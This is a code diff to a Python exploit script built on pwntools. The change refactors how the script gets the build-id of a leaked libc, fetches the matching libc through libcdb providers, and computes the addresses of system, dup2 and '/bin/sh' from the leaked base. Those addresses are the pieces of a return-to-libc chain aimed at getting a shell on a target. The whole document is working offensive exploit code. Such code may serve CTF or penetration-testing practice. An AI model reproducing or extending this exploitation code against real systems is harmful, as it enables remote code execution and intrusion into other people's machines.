@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+from typing import Any
 from pwn import pwnlib, ELF, p64, u64
 from subprocess import PIPE, Popen
 from time import sleep
@@ -130,13 +131,15 @@ def getSymboles(ExploitStructure):
 	base = u64(ExploitStructure.libc_base)
 
 	if not ExploitStructure.no_lib_leak and not ExploitStructure.build_id:
-		cmd = 'readelf -n LEAKEDLIBC | grep BUILD_ID -A1'
 		try:
-			print(pt.cjau + "[:] Getting BuildID..." + pt.cend)
-			p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
-			stdout, stderr = p.communicate()
-			ExploitStructure.build_id = (stdout.decode("utf-8")).split('tion: ')[1].strip("\x0A")
-			print(pt.cver + "[+] BuildID   :	" + ExploitStructure.build_id) 
+			data: bytes = open("LEAKEDLIBC", "rb").read()
+			idx: int = data.find(b"GNU\x00")
+			if idx < 0:
+				raise IndexError("build-id not found")
+			ExploitStructure.build_id = data[idx + 4:idx + 4 + 20].hex()
+			if len(ExploitStructure.build_id) != 40:
+				raise IndexError("incomplete build-id in leaked libc")
+			print(pt.cver + "[+] BuildID   :	" + ExploitStructure.build_id + pt.cend)
 
 		except IndexError:
 			print(pt.cred + "[!] Can't get BuildID : problem with the leaked libc" + pt.cend)
@@ -145,12 +148,25 @@ def getSymboles(ExploitStructure):
 			print(pt.cred + "[!] Can't get BuildID ; exception information : " + pt.cend + str(e))
 			exit(pt.cjau + "[:] Exploitation interruption..." + pt.cend)
 
-	try:
-		libc = ELF(pwnlib.libcdb.search_by_build_id(ExploitStructure.build_id))
-	except TypeError:
+	libc_bytes = None
+	for provider in ('provider_libcdb', 'provider_libc_rip'):
+		provider: Any | None = getattr(pwnlib.libcdb, provider, None)
+		if provider is None:
+			continue
+		try:
+			libc_bytes = provider(ExploitStructure.build_id, 'build_id')
+		except Exception:
+			libc_bytes = None
+		if libc_bytes:
+			break
+
+	if not libc_bytes:
 		print(pt.cred + "[!] Error with the given BuildID" + pt.cend)
 		exit(pt.cjau + "[:] Exploitation interruption..." + pt.cend)
 
+	with open("LIBC.so", "wb") as f:
+		f.write(libc_bytes)
+	libc 	= ELF("LIBC.so", checksec=False)
 	system	= p64(base + libc.symbols.system)
 	dup2	= p64(base + libc.symbols.dup2)
 	binsh	= p64(base + next(libc.search(b'/bin/sh\x00')))
